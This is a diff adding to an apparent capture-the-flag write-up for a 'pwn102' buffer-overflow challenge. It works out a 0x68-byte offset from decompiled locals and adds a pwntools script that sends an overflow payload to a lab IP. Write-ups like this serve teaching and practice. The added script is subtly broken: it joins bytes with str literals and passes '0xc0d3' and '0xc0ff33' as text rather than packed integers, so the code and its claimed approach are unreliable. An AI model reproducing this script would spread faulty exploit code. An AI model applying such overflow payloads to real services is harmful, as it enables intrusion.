@@ -20,3 +20,27 @@ Lets do a quick math finding the padding for the input
 
 <img width="206" height="58" alt="image" src="https://github.com/user-attachments/assets/b1268c3a-5d22-463f-9ad2-10928f2bfea5" />
 
+where we need to subtrac the `local_78` variable with `local_10` (they are in hex)
+
+So lets subtract them in hexadecimal
+
+<img width="530" height="224" alt="image" src="https://github.com/user-attachments/assets/0e76e6e5-c5b7-42bd-964a-4b20feb384b0" />
+
+we get 68.
+
+So lets write a simple script for thie challenge 
+
+## Script:
+```
+from pwn import *
+
+context.binary = binary = './pwn102.pwn102'
+
+payload = b'A'*0x68 + '0xc0d3' + '0xc0ff33'
+
+p = remote("10.201.127.254",9002)
+p.recv()
+p.sendline(payload)
+p.interactive()
+
+```
